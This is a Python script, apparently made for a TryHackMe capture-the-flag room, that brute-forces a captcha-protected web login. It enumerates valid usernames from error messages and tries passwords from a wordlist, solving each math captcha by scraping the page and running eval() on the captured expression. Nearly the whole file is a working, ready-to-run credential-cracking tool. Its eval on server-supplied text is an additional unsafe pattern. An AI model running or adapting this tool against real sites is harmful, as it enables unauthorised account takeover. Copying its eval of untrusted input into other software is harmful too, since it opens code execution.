import requests
from bs4 import BeautifulSoup
import re
import threading
import argparse
from time import sleep
import warnings
import time
import math

warnings.filterwarnings("ignore", category=DeprecationWarning) 



parser = argparse.ArgumentParser(
    prog="THM_CAPTURE_CRACKER.py",
    description="Crack a sites password that has a captcha (math captcha)",
    epilog="python3 THM_CAPTURE_CRACKER.py http://{THM_IP}/login -ul usernames.txt -pl passwords.txt -iuq \"does not exist\" -ipq \"Invalid\" -v"

)

parser.add_argument('url', help="The full URL for the requests")
parser.add_argument('-ul', '--username-list', help="The location of the usernames list", required=True)
parser.add_argument('-pl','--password-list', help="The location of the passwords list", required=True)
parser.add_argument('-v', '--verbose', action='store_true', help="Do you want to enable Verbose mode?", required=False)
parser.add_argument('-iuq', '--invalid-username-query', help="How should the program know when a username is invalid", required=True)
parser.add_argument('-ipq', '--invalid-password-query', help="How should the program know when a password is invalid", required=True)

print("""
   _____                         _      _                     _     _                                                                          _ 
  / ____|                       | |    (_)                   | |   | |                                                                        | |
 | |       _ __    __ _    ___  | | __  _   _ __     __ _    | |_  | |__     ___     _ __     __ _   ___   ___  __      __   ___    _ __    __| |
 | |      | '__|  / _` |  / __| | |/ / | | | '_ \   / _` |   | __| | '_ \   / _ \   | '_ \   / _` | / __| / __| \ \ /\ / /  / _ \  | '__|  / _` |
 | |____  | |    | (_| | | (__  |   <  | | | | | | | (_| |   | |_  | | | | |  __/   | |_) | | (_| | \__ \ \__ \  \ V  V /  | (_) | | |    | (_| |
  \_____| |_|     \__,_|  \___| |_|\_\ |_| |_| |_|  \__, |    \__| |_| |_|  \___|   | .__/   \__,_| |___/ |___/   \_/\_/    \___/  |_|     \__,_|
                                                     __/ |                          | |                                                          
                                                    |___/                           |_|                                                          
  ____              __  __           _     _                       _____                                                                         
 |  _ \            |  \/  |         | |   | |                     |  __ \                                                                        
 | |_) |  _   _    | \  / |   __ _  | |_  | |__    _   _   ___    | |__) |   ___   _ __    ___    ___    _ __                                    
 |  _ <  | | | |   | |\/| |  / _` | | __| | '_ \  | | | | / __|   |  ___/   / _ \ | '_ \  / __|  / _ \  | '_ \                                   
 | |_) | | |_| |   | |  | | | (_| | | |_  | | | | | |_| | \__ \   | |      |  __/ | | | | \__ \ | (_) | | | | |                                  
 |____/   \__, |   |_|  |_|  \__,_|  \__| |_| |_|  \__, | |___/   |_|       \___| |_| |_| |___/  \___/  |_| |_|                                  
           __/ |                                    __/ |                                                                                        
          |___/                                    |___/                                                                                         
""")
# ASCII Art generated with: https://patorjk.com/software/taag

sleep(2)
print('Before using, force the captcha')

args = parser.parse_args()

def main():
    start=time.time()
    
    dump_request = None

    name = None
    passw = None

    usernames = open(f'{args.username_list}' , 'r').read().split('\n')
    passwords = open(f'{args.password_list}' , 'r').read().split('\n')

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'nl-NL,nl',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': f'{args.url}',
        'Referer': f'{args.url}',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }



    def solve_captcha():
        data = {
            'username': "username",
            'password': "password",
            'captcha': '635',
        }

        response = requests.post(f'{args.url}', headers=headers, data=data, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        label = soup.find('label', text="Captcha enabled")
        captcha = label.find_next_sibling(text=True).replace(" = ?", "").replace(' ', "")
        answer = eval(captcha)

        return answer

    def brute(username, password, captcha):
        data = {
            "username": username,
            "password": password,
            "captcha": captcha,
        }
        if args.verbose == True:
            print(data)

        response = requests.post(f'{args.url}', headers=headers, data=data, verify=False)
        return response.text
    
    def crack_password(username):
        for password in passwords:
            captcha = solve_captcha()
            resp2 = brute(username, password, captcha)
            if not "Invalid" in resp2:
                open('successfull_login.html', 'w').write(resp2)
                print("\n"+"Password Found: " + password +"\n")
                return password

    
    def crack_username():
        
        for username in usernames:
            captcha = solve_captcha()
            resp = brute(username, "password", captcha)
            if not "does not exist" in resp: 
                print("\n"+"Username Found: " + username +"\n")
                password = crack_password(username)
                print(f"{username}:{password}")
                end = time.time()
                elapsed = round((end-start), 2)
                print(f"\nCracked the password in {elapsed} seconds\nLook at the successfull_login.html to see how the page looked like""")
                exit(0)
    crack_username()

main()
